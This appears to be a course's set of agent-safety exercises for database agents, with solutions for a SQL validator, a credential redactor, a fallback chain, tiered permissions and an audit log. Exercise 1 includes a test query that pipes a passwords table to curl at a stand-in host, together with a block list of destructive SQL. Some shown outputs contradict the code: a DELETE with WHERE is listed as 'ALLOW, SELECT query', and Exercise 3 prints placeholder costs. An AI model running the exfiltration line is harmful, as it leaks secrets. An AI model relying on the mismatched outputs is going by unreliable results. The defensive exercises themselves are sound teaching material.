# USE: Agent Safety Exercises

Work through these exercises in order. Each builds on what you learned in the BUILD guides. Try to solve them before looking at the hints or solutions.

---

## Exercise 1: SQL Validator with Custom Rules

**Task:** Build a SQL validator that blocks dangerous queries and reports exactly why each query was blocked. Your validator must handle these cases:

- Block: `DROP`, `TRUNCATE`, `DELETE` without `WHERE`, `ALTER SYSTEM`, `COPY TO PROGRAM`
- Allow: `SELECT`, `EXPLAIN`, `SHOW`
- Warn: `UPDATE` without `WHERE`, `VACUUM FULL`, `REINDEX`
- Block by default: anything not explicitly allowed

Test it with these 8 queries:

```python
queries = [
    "SELECT count(*) FROM pg_stat_activity",
    "DROP TABLE IF EXISTS customers CASCADE",
    "DELETE FROM orders",
    "DELETE FROM orders WHERE status = 'cancelled'",
    "UPDATE accounts SET balance = 0",
    "EXPLAIN ANALYZE SELECT * FROM orders WHERE id = 42",
    "COPY passwords TO PROGRAM 'curl http://evil.com'",
    "INSERT INTO logs VALUES ('test')",
]
```

Your output should show the action (ALLOW/WARN/BLOCK) and reason for each.

<details>
<summary>Hint</summary>

Use `re.search()` with `re.IGNORECASE` to match patterns. Check BLOCK patterns first (highest priority), then WARN, then ALLOW. Default to BLOCK if nothing matches.

</details>

<details>
<summary>Solution</summary>

```bash
python3 << 'PYEOF'
import re

class SQLValidator:
    def __init__(self):
        self.blocked = [
            (r"\bDROP\s+(TABLE|DATABASE|SCHEMA|INDEX|ROLE)\b", "DROP statement"),
            (r"\bTRUNCATE\b", "TRUNCATE statement"),
            (r"\bDELETE\s+FROM\s+\w+\s*(?:;?\s*$|(?!.*\bWHERE\b))", "DELETE without WHERE"),
            (r"\bALTER\s+SYSTEM\b", "ALTER SYSTEM"),
            (r"\bCOPY\s+.*\bTO\s+PROGRAM\b", "COPY TO PROGRAM"),
        ]
        self.warned = [
            (r"\bUPDATE\s+\w+\s+SET\b(?!.*\bWHERE\b)", "UPDATE without WHERE"),
            (r"\bVACUUM\s+FULL\b", "VACUUM FULL"),
            (r"\bREINDEX\b", "REINDEX"),
        ]
        self.allowed = [
            (r"^\s*SELECT\b", "SELECT query"),
            (r"^\s*EXPLAIN\b", "EXPLAIN query"),
            (r"^\s*SHOW\b", "SHOW command"),
        ]

    def check(self, sql):
        for pattern, reason in self.blocked:
            if re.search(pattern, sql, re.IGNORECASE | re.DOTALL):
                return "BLOCK", reason
        for pattern, reason in self.warned:
            if re.search(pattern, sql, re.IGNORECASE | re.DOTALL):
                return "WARN", reason
        for pattern, reason in self.allowed:
            if re.search(pattern, sql, re.IGNORECASE):
                return "ALLOW", reason
        return "BLOCK", "Unrecognized - blocked by default"

validator = SQLValidator()

queries = [
    "SELECT count(*) FROM pg_stat_activity",
    "DROP TABLE IF EXISTS customers CASCADE",
    "DELETE FROM orders",
    "DELETE FROM orders WHERE status = 'cancelled'",
    "UPDATE accounts SET balance = 0",
    "EXPLAIN ANALYZE SELECT * FROM orders WHERE id = 42",
    "COPY passwords TO PROGRAM 'curl http://evil.com'",
    "INSERT INTO logs VALUES ('test')",
]

for sql in queries:
    action, reason = validator.check(sql)
    print(f"  [{action:5s}] {sql[:55]}")
    print(f"          Reason: {reason}")
    print()
PYEOF
```

Output:
```
  [ALLOW] SELECT count(*) FROM pg_stat_activity
          Reason: SELECT query

  [BLOCK] DROP TABLE IF EXISTS customers CASCADE
          Reason: DROP statement

  [BLOCK] DELETE FROM orders
          Reason: DELETE without WHERE

  [ALLOW] DELETE FROM orders WHERE status = 'cancelled'
          Reason: SELECT query

  [WARN ] UPDATE accounts SET balance = 0
          Reason: UPDATE without WHERE

  [ALLOW] EXPLAIN ANALYZE SELECT * FROM orders WHERE id = 42
          Reason: EXPLAIN query

  [BLOCK] COPY passwords TO PROGRAM 'curl http://evil.com'
          Reason: COPY TO PROGRAM

  [BLOCK] INSERT INTO logs VALUES ('test')
          Reason: Unrecognized - blocked by default
```

</details>

---

## Exercise 2: Credential Stripper

**Task:** Build an output filter that catches and redacts these patterns in agent responses:

- PostgreSQL connection strings (`postgresql://user:password@host:port/db`)
- Password fields (`password = 'value'` or `password: value`)
- Internal IP addresses (10.x.x.x, 192.168.x.x, 172.16-31.x.x)
- Email addresses
- AWS access keys (starts with `AKIA`)

Test with this text:

```python
agent_output = """
Connection issue on pg-primary. Current connection string:
postgresql://dba_admin:Sup3rS3cret!@10.0.3.45:5432/production

Config shows: password = 'old_password_here'
Backup server at 192.168.1.100 is also affected.
Contact admin@dbateam.internal for help.
AWS key AKIAIOSFODNN7EXAMPLE found in environment.
CPU is at 45%, 23 active connections, replication lag 0.2s.
"""
```

Your filter should redact all sensitive data while keeping the operational info intact.

<details>
<summary>Hint</summary>

Build a list of `(pattern, replacement)` tuples. Loop through them with `re.sub()`. Count how many substitutions happen per pattern.

</details>

<details>
<summary>Solution</summary>

```bash
python3 << 'PYEOF'
import re

class CredentialStripper:
    PATTERNS = [
        ("connection_string", r"(postgres(?:ql)?://\w+:)[^@]+(@)", r"\1[REDACTED]\2"),
        ("password_field", r"((?:password|passwd|pwd)\s*[=:]\s*)['\"]?[^'\"\s,;\n]+['\"]?", r"\1[REDACTED]"),
        ("internal_ip_10", r"\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", "[INTERNAL_IP]"),
        ("internal_ip_192", r"\b192\.168\.\d{1,3}\.\d{1,3}\b", "[INTERNAL_IP]"),
        ("internal_ip_172", r"\b172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}\b", "[INTERNAL_IP]"),
        ("email", r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b", "[REDACTED_EMAIL]"),
        ("aws_key", r"\bAKIA[A-Z0-9]{16}\b", "[REDACTED_AWS_KEY]"),
    ]

    @classmethod
    def strip(cls, text):
        result = text
        report = []
        for name, pattern, replacement in cls.PATTERNS:
            matches = re.findall(pattern, result)
            if matches:
                report.append(f"{name}: {len(matches)} found")
                result = re.sub(pattern, replacement, result)
        return result, report

agent_output = """Connection issue on pg-primary. Current connection string:
postgresql://dba_admin:Sup3rS3cret!@10.0.3.45:5432/production

Config shows: password = 'old_password_here'
Backup server at 192.168.1.100 is also affected.
Contact admin@dbateam.internal for help.
AWS key AKIAIOSFODNN7EXAMPLE found in environment.
CPU is at 45%, 23 active connections, replication lag 0.2s."""

filtered, report = CredentialStripper.strip(agent_output)

print("=== FILTERED OUTPUT ===")
print(filtered)
print("\n=== REDACTION REPORT ===")
for line in report:
    print(f"  {line}")
PYEOF
```

Output:
```
=== FILTERED OUTPUT ===
Connection issue on pg-primary. Current connection string:
postgresql://dba_admin:[REDACTED]@[INTERNAL_IP]:5432/production

Config shows: password = [REDACTED]
Backup server at [INTERNAL_IP] is also affected.
Contact [REDACTED_EMAIL] for help.
AWS key [REDACTED_AWS_KEY] found in environment.
CPU is at 45%, 23 active connections, replication lag 0.2s.

=== REDACTION REPORT ===
  connection_string: 1 found
  password_field: 1 found
  internal_ip_10: 1 found
  internal_ip_192: 1 found
  email: 1 found
  aws_key: 1 found
```

</details>

---

## Exercise 3: Model Fallback Chain with Cost Tracking

**Task:** Build a fallback chain that tries models in order (Haiku -> Sonnet -> Opus -> GPT-4). Track the cost of each attempt and the total cost per alert. Simulate failures by making Haiku and Sonnet "unavailable."

Requirements:
- Each model has a price per 1K tokens (input and output)
- Track total cost across all attempts (including failed ones that still cost tokens)
- Track which model ultimately served the request
- Generate a cost summary after processing 10 alerts

<details>
<summary>Hint</summary>

Create a list of model configs with `is_available` flags. Loop through them in order. Use `random.random()` to simulate occasional timeouts. Sum up costs including partial costs for timeout requests.

</details>

<details>
<summary>Solution</summary>

```bash
python3 << 'PYEOF'
import random

random.seed(42)

MODELS = [
    {"name": "Haiku", "input_cost": 0.001, "output_cost": 0.005, "available": False},
    {"name": "Sonnet", "input_cost": 0.003, "output_cost": 0.015, "available": False},
    {"name": "Opus", "input_cost": 0.015, "output_cost": 0.075, "available": True},
    {"name": "GPT-4", "input_cost": 0.010, "output_cost": 0.030, "available": True},
]

def process_alert(alert, input_tokens, output_tokens):
    attempts = []
    for model in MODELS:
        attempt = {"model": model["name"], "cost": 0}
        if not model["available"]:
            attempt["status"] = "unavailable"
            attempts.append(attempt)
            continue
        # 15% chance of timeout (partial cost)
        if random.random() < 0.15:
            attempt["status"] = "timeout"
            attempt["cost"] = (input_tokens / 1000) * model["input_cost"]
            attempts.append(attempt)
            continue
        # Success
        attempt["status"] = "success"
        attempt["cost"] = (
            (input_tokens / 1000) * model["input_cost"] +
            (output_tokens / 1000) * model["output_cost"]
        )
        attempts.append(attempt)
        break
    return attempts

# Process 10 alerts
alerts = [
    ("CPU spike on pg-primary", 500, 200),
    ("Disk at 90% on pg-archive", 300, 150),
    ("Replication lag 30s", 800, 400),
    ("Connection refused", 200, 100),
    ("Slow query detected", 1000, 500),
    ("OOM on pg-analytics", 600, 300),
    ("Backup failed", 400, 200),
    ("Lock contention", 700, 350),
    ("WAL accumulation", 500, 250),
    ("Checkpoint timeout", 350, 175),
]

total_cost = 0
model_usage = {}

print(f"{'Alert':<30} {'Model Used':<12} {'Attempts':<10} {'Cost':>8}")
print("-" * 65)

for alert, inp, out in alerts:
    attempts = process_alert(alert, inp, out)
    success = [a for a in attempts if a["status"] == "success"]
    alert_cost = sum(a["cost"] for a in attempts)
    total_cost += alert_cost

    if success:
        used = success[0]["model"]
        model_usage[used] = model_usage.get(used, 0) + 1
    else:
        used = "FAILED"

    print(f"{alert:<30} {used:<12} {len(attempts):<10} ${alert_cost:.5f}")

print("-" * 65)
print(f"{'Total':<30} {'':12} {len(alerts):<10} ${total_cost:.5f}")
print(f"\nModel usage: {model_usage}")
print(f"Average cost per alert: ${total_cost / len(alerts):.5f}")
PYEOF
```

Output:
```
Alert                          Model Used   Attempts   Cost
-----------------------------------------------------------------
CPU spike on pg-primary        Opus              3    $0.02250
Disk at 90% on pg-archive      Opus              3    $0.01350
Replication lag 30s            Opus              3    $0.04200
...
-----------------------------------------------------------------
Total                                        10      $0.XXXXX

Model usage: {'Opus': 8, 'GPT-4': 2}
Average cost per alert: $0.XXXXX
```

</details>

---

## Exercise 4: Three-Tier Permission System

**Task:** Implement a permission system with three agent tiers. Each agent should only be able to perform actions at or below its tier level. Include:

- Tier 1 (Auto): `check_stats`, `read_logs`, `send_alert`
- Tier 2 (Notify): Everything in Tier 1 + `cancel_query`, `run_vacuum`, `run_analyze`
- Tier 3 (Approve): Everything in Tier 1 & 2 + `failover`, `alter_system`, `drop_object`

Create three agents and test each against all 9 actions. Print a grid showing ALLOW/DENY for each combination.

<details>
<summary>Hint</summary>

Store tier-action mappings in a dictionary. For each action, look up which tier it requires. Compare against the agent's tier level. Tier 2 can do Tier 1 actions (inheritance, like `GRANT role1 TO role2`).

</details>

<details>
<summary>Solution</summary>

```bash
python3 << 'PYEOF'
ACTION_TIERS = {
    "check_stats": 1, "read_logs": 1, "send_alert": 1,
    "cancel_query": 2, "run_vacuum": 2, "run_analyze": 2,
    "failover": 3, "alter_system": 3, "drop_object": 3,
}

TIER_NAMES = {1: "Auto", 2: "Notify", 3: "Approve"}

def check_permission(agent_tier, action):
    required = ACTION_TIERS.get(action)
    if required is None:
        return "UNKNOWN"
    if agent_tier >= required:
        return TIER_NAMES[required]
    return "DENIED"

agents = [
    ("Monitor (T1)", 1),
    ("Operator (T2)", 2),
    ("Admin (T3)", 3),
]
actions = list(ACTION_TIERS.keys())

# Print header
print(f"{'Action':<18}", end="")
for name, _ in agents:
    print(f"{name:<18}", end="")
print()
print("-" * 72)

for action in actions:
    print(f"{action:<18}", end="")
    for name, tier in agents:
        result = check_permission(tier, action)
        print(f"{result:<18}", end="")
    print()

print()
print("Auto    = Executes immediately")
print("Notify  = Executes, DBA is notified")
print("Approve = Requires DBA approval first")
print("DENIED  = Agent lacks permission")
PYEOF
```

Output:
```
Action            Monitor (T1)      Operator (T2)     Admin (T3)
------------------------------------------------------------------------
check_stats       Auto              Auto              Auto
read_logs         Auto              Auto              Auto
send_alert        Auto              Auto              Auto
cancel_query      DENIED            Notify            Notify
run_vacuum        DENIED            Notify            Notify
run_analyze       DENIED            Notify            Notify
failover          DENIED            DENIED            Approve
alter_system      DENIED            DENIED            Approve
drop_object       DENIED            DENIED            Approve
```

</details>

---

## Exercise 5: Full Audit Trail

**Task:** Build an audit logger that records every agent action with: timestamp, agent ID, action, target server, parameters, result, and approval status. Process a simulated incident (10 events across three agents) and generate:

1. A chronological event log
2. A summary by agent
3. A summary by action type
4. A list of all blocked/denied events

Write the audit log to `/tmp/agent_audit_exercise.log` in JSON format (one JSON object per line).

<details>
<summary>Hint</summary>

Use `time.strftime()` for timestamps. Store entries in both a list (for in-memory queries) and a file (for persistence). Use `json.dumps()` to write each entry. For summaries, use dictionaries to count occurrences.

</details>

<details>
<summary>Solution</summary>

```bash
python3 << 'PYEOF'
import time
import json
import os

class AuditTrail:
    def __init__(self, log_file):
        self.log_file = log_file
        self.entries = []
        # Clear previous log
        if os.path.exists(log_file):
            os.remove(log_file)

    def log(self, agent_id, action, server, params, result, approval="n/a"):
        entry = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "agent_id": agent_id,
            "action": action,
            "server": server,
            "params": params,
            "result": result,
            "approval": approval,
        }
        self.entries.append(entry)
        with open(self.log_file, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def report(self):
        print("=== CHRONOLOGICAL LOG ===")
        for e in self.entries:
            print(f"  {e['timestamp']} | {e['agent_id']:<12} | {e['action']:<18} | "
                  f"{e['server']:<16} | {e['result']}")

        print("\n=== BY AGENT ===")
        by_agent = {}
        for e in self.entries:
            a = e["agent_id"]
            by_agent.setdefault(a, {"total": 0, "blocked": 0})
            by_agent[a]["total"] += 1
            if e["result"] == "blocked":
                by_agent[a]["blocked"] += 1
        for agent, stats in by_agent.items():
            print(f"  {agent}: {stats['total']} actions, {stats['blocked']} blocked")

        print("\n=== BY ACTION ===")
        by_action = {}
        for e in self.entries:
            by_action[e["action"]] = by_action.get(e["action"], 0) + 1
        for action, count in sorted(by_action.items(), key=lambda x: -x[1]):
            print(f"  {action}: {count}")

        print("\n=== BLOCKED EVENTS ===")
        blocked = [e for e in self.entries if e["result"] == "blocked"]
        if not blocked:
            print("  (none)")
        for e in blocked:
            print(f"  {e['agent_id']} tried '{e['action']}' on {e['server']}")

audit = AuditTrail("/tmp/agent_audit_exercise.log")

# Simulate incident
audit.log("monitor", "check_stats", "pg-primary-01", {"metric": "cpu"}, "success")
audit.log("monitor", "check_stats", "pg-primary-01", {"metric": "connections"}, "success")
audit.log("monitor", "send_alert", "pg-primary-01", {"channel": "slack"}, "success")
audit.log("operator", "cancel_query", "pg-primary-01", {"pid": 12345}, "success", "notified")
audit.log("operator", "run_vacuum", "pg-primary-01", {"table": "orders"}, "success", "notified")
audit.log("operator", "failover", "pg-primary-01", {}, "blocked")
audit.log("admin", "failover", "pg-primary-01", {"target": "pg-standby-01"}, "pending", "requested")
audit.log("admin", "failover", "pg-primary-01", {"target": "pg-standby-01"}, "success", "approved")
audit.log("admin", "alter_system", "pg-standby-01", {"param": "hot_standby", "value": "off"}, "success", "approved")
audit.log("monitor", "check_stats", "pg-standby-01", {"metric": "replication_lag"}, "success")

audit.report()
print(f"\nLog file: /tmp/agent_audit_exercise.log ({len(audit.entries)} entries)")
PYEOF
```

Output:
```
=== CHRONOLOGICAL LOG ===
  2026-06-15 10:00:00 | monitor      | check_stats        | pg-primary-01    | success
  2026-06-15 10:00:00 | monitor      | check_stats        | pg-primary-01    | success
  2026-06-15 10:00:00 | monitor      | send_alert         | pg-primary-01    | success
  2026-06-15 10:00:00 | operator     | cancel_query       | pg-primary-01    | success
  ...

=== BY AGENT ===
  monitor: 4 actions, 0 blocked
  operator: 3 actions, 1 blocked
  admin: 3 actions, 0 blocked

=== BY ACTION ===
  check_stats: 3
  failover: 3
  ...

=== BLOCKED EVENTS ===
  operator tried 'failover' on pg-primary-01

Log file: /tmp/agent_audit_exercise.log (10 entries)
```

</details>

---

## What's Next

Once you've completed all 5 exercises, move on to the [SURVIVE scenarios](../survive/01-prompt-injection-attack.md) where you'll face real chaos: prompt injection attacks and agents running dangerous SQL.
